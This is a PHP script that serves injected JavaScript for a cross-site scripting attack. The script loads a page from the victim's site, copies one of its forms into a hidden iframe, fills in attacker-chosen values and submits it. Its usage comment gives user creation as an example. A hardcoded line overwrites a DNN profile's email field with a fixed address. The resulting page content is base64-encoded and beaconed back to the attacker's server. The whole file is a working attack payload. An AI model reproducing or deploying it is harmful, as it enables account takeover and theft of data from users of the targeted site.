<?php
  /*
    Inject into a page in order to retrieve and submit a form from another page
  */
  header( "Content-type: text/javascript" );
  $url = "//".$_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
  echo "// $url\n";
  if( !isset( $_GET["c"] ) ){
    echo "/*\n Inject with:\n ".$url."?form=0&el[email]=someone@somewhere.com&el[password]=Password123&url=createuser.php\n";
    echo " Where:\n"
      ."   form is the zero-based index of the form on the page you want to submit\n"
      ."   el[] is a keyed array of form values to set on the form\n"
      ."   url is the URL of the form you want to submit\n"
      ."   action is an overide action URL to set the form to\n"
      ."*/\n";
   
    $form = !empty( $_GET["form"] ) ? intval($_GET["form"]) : '0';
    $els = !empty( $_GET["el"] ) ? $_GET["el"] : null;
    $els["dnn\$ctr441\$ProfileEditor\$EmailTextBox"] = 'iwallace@nettitude.com';
    
    // Function to get page
    echo "
      function g(u){ 
        console.log('g()');
	x=new XMLHttpRequest(); 
        x.open('GET',u,true); 
        x.onload = function(e){
         console.log('Loaded', x); 
	  if( x.readyState === 4 && x.status === 200 ){
            procFrm(x.responseText);
          }
        }; 
        x.send(null); 
      }\n";

    // Function to handle loading of iframe
    echo "
      function ifload(){
        content = document.getElementById('xss_target').contentDocument.body.innerHTML;
        new Image().src = '".$url."?loaded&c=' + encodeURIComponent(btoa(content));
      }
    ";

    // Function to add form to current page, add an iframe, change target to iframe, set fields, submit
    echo "
      function procFrm(html){
        parser = new DOMParser();
        doc = parser.parseFromString(html,'text/html');
	frm = doc.getElementsByTagName('form')[$form];
        console.log(frm);
	frm.id = 'xss_submitform';
	// frm.style = 'display: none;';
	b = document.getElementsByTagName('body')[0];
        b.appendChild( frm );
        frm = document.getElementById('xss_submitform'); 
        b.innerHTML += '<iframe name=\"xss_target\" id=\"xss_target\" style=\"display: none;\"></iframe>';
        document.getElementById('xss_target').onload = ifload;
        frm.target = 'xss_target';\n";
	echo "frm.onsubmit = ''\n";
     if( isset( $_GET["action"] ) ){
        echo "        frm.action = '".$_GET["action"]."';\n";
     }
     if( isset( $els ) ){
       foreach( $els as $k => $v ){
         echo "        frm.elements.namedItem('$k').value = '$v';\n";
         echo "        console.log(frm.elements.namedItem('$k').value);\n";
       }
     }
     echo "        frm.submit();
      }
    ";
    
    // Call function to get the page, pass function to process the form
    echo "
      g('/Home/Settings/MyProfile/tabid/62/userid/100417/Default.aspx');\n";
      // g('".$_GET["url"]."');\n";
?>
<?php }else{
  echo "/*\n".base64_decode( $_GET["c"] )."\n*/\n";
}?>
